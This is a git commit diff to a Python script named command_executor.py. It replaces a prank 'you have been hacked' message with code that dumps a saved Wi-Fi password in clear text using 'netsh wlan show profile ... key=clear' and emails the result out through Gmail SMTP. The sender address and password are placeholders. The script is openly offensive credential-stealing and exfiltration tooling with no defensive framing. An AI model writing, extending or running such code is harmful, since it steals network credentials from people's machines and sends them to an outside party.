498f80ba225bfcf746980aa2adfaf07febf156f2
Maffey <matiusz98@gmail.com>
2020-04-10 19:07:05 +0200

    further work on command_executor.py

--- command_executor.py
+++ command_executor.py
@@ -1,6 +1,19 @@
 #! /usr/bin/env python
 
 import subprocess
+import smtplib
 
-command = "msg * You have been hacked!"
-subprocess.Popen(command, shell=True)
+
+def send_mail(email, password, message):
+    server = smtplib.SMTP("smtp.gmail.com", 587)
+    server.starttls()
+    server.login(email, password)
+    server.sendmail(email, email, message)
+    server.quit()
+
+
+# TODO: add so that smtp server and user details are arguments
+wlan_name = "Vectra-WiFi-xxxxxx"
+command = f"netsh wlan show profile {wlan_name} key=clear"
+result = subprocess.check_output(command, shell=True)
+send_mail("example@gmail.com", "password", result)  # fill with necessary data for it to work
